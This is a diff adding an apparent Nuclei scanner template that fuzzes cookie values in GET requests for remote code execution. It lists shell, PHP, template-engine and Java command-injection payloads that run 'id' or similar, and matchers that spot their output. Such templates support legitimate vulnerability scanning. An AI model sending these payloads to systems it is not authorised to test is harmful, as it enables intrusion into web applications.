@@ -1,0 +1,84 @@
+id: rce-cookie-replace
+
+info:
+  name: Remote Code Execution
+  author: reewardius
+  severity: critical
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-cookie,dast
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          
+    payloads:
+      rce:
+        - "$(id)"
+        - "%2560id%2560"
+        - "%26id%26"
+        - "%60id%60"
+        - "'.system('id').'"
+        - "'.system('perl -v').'"
+        - "'i'd"
+        - "'id'"
+        - "**id**"
+        - "*id"
+        - "*id*"
+        - "/*$(id)`id`"
+        - "`id`"
+        - "`id`#"
+        - "`id`&"
+        - "i`u`d"
+        - "id"
+        - "id;"
+        - "id|"
+        - "&id&"
+        - "import os;os.system('id');"
+        - "{% import os %}{{os.system('id')"
+        - '"i"d'
+        - '<%25+system("id")+%25>'
+        - '<%= system("id") %>'
+        - '<?php escapeshellcmd("id"); ?>'
+        - '<?php exec("id"); ?>'
+        - '<?php shell_exec("id"); ?>'
+        - '<?php system("id"); ?>'
+        - 'T(java.lang.Runtime).getRuntime().exec("id")'
+        - '`/usr/bin/id`'
+        - 'echo `id`;'
+        - 'echo exec(id);'
+        - 's:19:"<?php phpinfo(); ?>";'
+        
+    fuzzing:
+      - part: cookie
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "'id' is not recognized as an internal or external command"
+          - "syntax error near unexpected token `"
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+        
+      - type: word
+        part: body
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        condition: and
+        
+      - type: word
+        words:
+          - "This is perl"
